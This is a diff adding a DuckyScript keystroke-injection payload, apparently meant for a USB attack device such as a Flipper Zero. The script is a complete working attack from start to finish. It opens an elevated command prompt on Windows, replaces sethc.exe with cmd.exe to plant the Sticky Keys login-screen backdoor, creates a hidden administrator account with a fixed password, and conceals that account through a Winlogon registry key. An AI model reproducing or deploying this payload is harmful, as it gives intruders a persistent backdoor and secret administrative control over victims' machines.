@@ -1,0 +1,45 @@
+DELAY 2000
+REM Trigger Run box (Windows + R)
+GUI r
+DELAY 500
+REM Launch Command Prompt
+STRING cmd
+DELAY 500
+REM Open Command Prompt as Administrator
+CTRL-SHIFT ENTER
+DELAY 2000
+REM Open Task View and Refocus
+GUI TAB
+DELAY 500
+ESCAPE
+DELAY 500
+TAB
+DELAY 500
+ALT y
+DELAY 500
+REM Take Ownership of sethc.exe
+STRING takeown /f c:\windows\system32\sethc.exe
+ENTER
+DELAY 1000
+REM Grant Full Control Permissions
+STRING icacls c:\windows\system32\sethc.exe /grant administrators:F
+ENTER
+DELAY 1000
+REM Replace sethc.exe with cmd.exe
+STRING copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y
+ENTER
+DELAY 1000
+REM Create Hidden Admin Account
+STRING net user Riddle Flipper /add
+ENTER
+DELAY 500
+STRING net localgroup administrators Riddle /add
+ENTER
+DELAY 500
+REM Hide the Account in Registry
+STRING reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Riddle /t REG_DWORD /d 0 /f
+ENTER
+DELAY 1000
+REM Exit Command Prompt
+STRING exit
+ENTER
